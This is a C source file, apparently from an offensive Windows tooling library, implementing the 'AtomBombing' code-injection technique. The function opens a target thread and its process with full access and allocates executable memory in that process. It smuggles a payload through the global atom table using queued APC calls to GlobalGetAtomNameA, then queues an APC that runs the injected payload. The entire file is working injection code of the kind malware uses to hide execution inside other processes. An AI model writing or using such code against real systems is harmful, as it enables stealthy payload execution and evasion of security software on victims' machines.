#include "Win32Helper.h"

BOOL MpfPiQueueUserAPCViaAtomBomb(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _In_ DWORD TargetThreadId)
{
	HANDLE hHandle = NULL;
	LPVOID BaseAddress = NULL;
	HANDLE hThread = NULL;
	BOOL bFlag = FALSE;
	NTQUEUEAPCTHREAD NtQueueApcThread = NULL;
	HMODULE hModule = NULL;
	ATOM Alpha = ERROR_SUCCESS, Bravo = ERROR_SUCCESS;
	PCHAR pPayload = (PCHAR)Payload;

	hModule = GetModuleHandleEx2W(L"ntdll.dll");
	if (hModule == NULL)
		goto EXIT_ROUTINE;

	NtQueueApcThread = (NTQUEUEAPCTHREAD)GetProcAddressA((DWORD64)hModule, "NtQueueApcThread");
	if (!NtQueueApcThread)
		goto EXIT_ROUTINE;

	hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, TargetThreadId);
	if (hThread == NULL)
		goto EXIT_ROUTINE;

	hHandle = OpenProcess(0x001fffff, FALSE, GetProcessIdOfThread(hThread));
	if (hHandle == NULL)
		goto EXIT_ROUTINE;

	BaseAddress = VirtualAllocEx(hHandle, NULL, PayloadSizeInBytes, 0x00003000, 0x00000040);
	if (BaseAddress == NULL)
		goto EXIT_ROUTINE;

	Bravo = GlobalAddAtomA("b");
	if (Bravo == 0)
		goto EXIT_ROUTINE;

	if (pPayload[0] == '\0')
		goto EXIT_ROUTINE;

	for (DWORD64 Position = PayloadSizeInBytes - 1; Position > 0; Position--)
	{
		if ((pPayload[Position] == '\0') && (pPayload[Position - 1] == '\0'))
			NtQueueApcThread(hThread, GlobalGetAtomNameA, (PVOID)Bravo, (PVOID)(((DWORD64)BaseAddress) + Position - 1), (PVOID)2);
	}

	for (PCHAR Position = pPayload; Position < (pPayload + PayloadSizeInBytes); Position += strlen(Position) + 1)
	{
		if (*Position == '\0')
			continue;

		Alpha = GlobalAddAtomA(Position);
		if (Alpha == 0)
			goto EXIT_ROUTINE;

		NtQueueApcThread(hThread, GlobalGetAtomNameA, (PVOID)Alpha, (PVOID)(((DWORD64)BaseAddress) + (Position - pPayload)), (PVOID)(StringLengthA(Position) + 1));
	}

	QueueUserAPC((PAPCFUNC)BaseAddress, hThread, 0);

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hThread)
		CloseHandle(hThread);

	return bFlag;
}